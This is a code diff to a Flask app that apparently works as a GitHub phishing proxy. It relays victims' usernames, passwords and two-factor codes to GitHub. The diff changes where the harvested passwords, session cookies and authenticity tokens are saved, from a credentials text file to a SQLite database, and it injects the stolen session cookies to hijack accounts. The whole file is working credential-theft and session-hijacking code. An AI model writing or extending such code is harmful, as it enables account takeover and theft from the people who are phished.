@@ -3,6 +3,8 @@ from scripts.login import get_login_page, perform_login, perform_2fa, execute_2f
 from dotenv import load_dotenv
 from injector.inject_cookie import inject_and_verify_github_cookies
 import os
+import sqlite3
+
 
 app = Flask(__name__)
 
@@ -23,17 +25,25 @@ def session():
 
     response_html, success, cookies = perform_login(username, password)
 
-
     flask_session["username"] = username
     flask_session["password"] = password
+
+    conn = sqlite3.connect("users.db")
+    cursor = conn.cursor()
 
     with open("templates/response.html", "w", encoding="utf-8") as f:
         f.write(response_html)
 
     if success == "success":
-        with open("credentials/credentials.txt", "w") as f:
-            f.write("Username: " + flask_session.get("username") + " Password: " + flask_session.get("password") + " Authentication Cookie: " + flask_session.get("authenticity_token") + "\n")
-        
+        cookies_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
+        cursor.execute("""
+        INSERT OR REPLACE INTO users (username, password, cookies, authenticity_token)
+        VALUES (?, ?, ?, ?)
+        """, (username, password, cookies_str, flask_session.get("authenticity_token")))
+
+        conn.commit()
+        conn.close()
+
         response = make_response(redirect("https://github.com/"))
         for cookie_name, cookie_value in cookies.items():
             response.set_cookie(
@@ -45,6 +55,7 @@ def session():
 
         return response
 
+    conn.close()
     return render_template("index.html", github_login=response_html), 200
 
 @app.route("/sessions/two-factor/app", methods=["GET"])
@@ -67,9 +78,22 @@ def post_two_fa():
     with open("templates/response.html", "w", encoding="utf-8") as f:
         f.write(response_html)
 
+    conn = sqlite3.connect("users.db")
+    cursor = conn.cursor()
+
     if status == "success":
-        with open("credentials/credentials.txt", "w") as f:
-            f.write("Username: " + flask_session.get("username") + " Password: " + flask_session.get("password") + " OTP: " + app_otp + " Authentication Cookie: " + flask_session.get("authenticity_token") + "\n")
+        cookies_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
+        cookies_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
+        cursor.execute(
+            """
+        INSERT OR REPLACE INTO users (username, password, cookies, authenticity_token)
+        VALUES (?, ?, ?, ?)
+        """,
+            (flask_session.get("username"), flask_session.get("password"), cookies_str, flask_session.get("authenticity_token")),
+        )
+
+        conn.commit()
+        conn.close()
 
         inject_and_verify_github_cookies(cookies)
 
@@ -80,12 +104,12 @@ def post_two_fa():
                 cookie_value,
                 domain=".github.com",
                 path="/",
-                samesite="None",  # Allow cross-site requests
-                secure=True,  # Ensure cookies are sent over HTTPS
+                samesite="None",  
+                secure=True, 
             )
 
         return response
-
+    conn.close()
     return render_template("response.html")
 
 if __name__ == "__main__":
